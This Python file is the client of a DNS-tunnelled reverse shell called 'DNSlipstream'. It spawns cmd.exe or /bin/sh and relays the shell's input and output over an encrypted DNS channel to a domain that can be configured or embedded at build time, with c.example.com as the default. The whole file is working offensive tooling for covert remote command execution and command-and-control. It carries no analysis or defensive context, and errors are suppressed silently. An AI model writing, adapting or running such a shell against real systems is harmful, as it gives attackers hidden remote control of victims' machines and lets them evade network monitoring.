# shell.py
import sys
import os
import subprocess
import platform


sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from lib.transport.stream import dns_stream


# Try to import embedded config first
try:
    from lib.config_embedded import ENCRYPTION_KEY as EMBEDDED_KEY
    from lib.config_embedded import DOMAIN_NAME as EMBEDDED_DOMAIN
except ImportError:
    EMBEDDED_KEY = None
    EMBEDDED_DOMAIN = None


# Get from environment or embedded config
TARGET_DOMAIN = EMBEDDED_DOMAIN or os.getenv('TARGET_DOMAIN') or 'c.example.com'
ENCRYPTION_KEY = EMBEDDED_KEY or os.getenv('ENCRYPTION_KEY') or ''


# Validate
if not ENCRYPTION_KEY:
    print("ERROR: ENCRYPTION_KEY not set!")
    print("Build binary with embedded key or set environment variable.")
    sys.exit(1)

if len(ENCRYPTION_KEY) != 64:
    print(f"ERROR: Invalid key length: {len(ENCRYPTION_KEY)}")
    sys.exit(1)

print(f"=== DNSlipstream Client ===")


def main():
    """Main function to run the reverse shell client."""
    
        # Check if configuration is provided
    if not TARGET_DOMAIN or not ENCRYPTION_KEY:
        print("Error: TARGET_DOMAIN and ENCRYPTION_KEY must be set")
        print("Usage: TARGET_DOMAIN=c.example.com ENCRYPTION_KEY=<hex_key> python shell.py")
        sys.exit(1)
    
    # Determine which shell to use based on operating system
    if platform.system() == "Windows":
        shell_cmd = ["cmd.exe"]
    else:
        shell_cmd = ["/bin/sh", "-c", "/bin/sh"]
    
    # Create DNS transport stream with multi-channel enabled
    try:
        dns_transport = dns_stream(
            target_domain=TARGET_DOMAIN,
            encryption_key=ENCRYPTION_KEY,
            max_workers=8,
            enable_multi_channel=True,
            preferred_record_types=None  # Use all record types
        )
    except Exception:
        sys.exit(1)
    
    # Spawn the shell process with DNS transport as stdin/stdout/stderr
    try:
        cmd = subprocess.Popen(
            shell_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0  # Unbuffered
        )
        
        # Bridge shell I/O to DNS transport
        import threading
        
        def pipe_stdin():
            """Read from DNS and write to shell stdin."""
            try:
                while True:
                    data = dns_transport.read(timeout=1.0)
                    if data:
                        cmd.stdin.write(data)
                        cmd.stdin.flush()
                    
                    # Check if process is still alive
                    if cmd.poll() is not None:
                        break
            except Exception:
                pass
        
        def pipe_stdout():
            """Read from shell stdout and write to DNS."""
            try:
                while True:
                    data = cmd.stdout.read(1024)
                    if data:
                        dns_transport.write(data)
                    elif cmd.poll() is not None:
                        break
            except Exception:
                pass
        
        def pipe_stderr():
            """Read from shell stderr and write to DNS."""
            try:
                while True:
                    data = cmd.stderr.read(1024)
                    if data:
                        dns_transport.write(data)
                    elif cmd.poll() is not None:
                        break
            except Exception:
                pass
        
        # Start I/O bridge threads
        threading.Thread(target=pipe_stdin, daemon=True).start()
        threading.Thread(target=pipe_stdout, daemon=True).start()
        threading.Thread(target=pipe_stderr, daemon=True).start()
        
        # Wait for shell to exit
        cmd.wait()
        
        # Clean up
        dns_transport.close()
        
    except KeyboardInterrupt:
        # Clean shutdown
        try:
            cmd.terminate()
            cmd.wait(timeout=2)
        except:
            cmd.kill()
        
        dns_transport.close()
        sys.exit(0)
        
    except Exception:
        # Clean up
        try:
            cmd.kill()
        except:
            pass
        
        dns_transport.close()
        sys.exit(1)


if __name__ == "__main__":
    main()
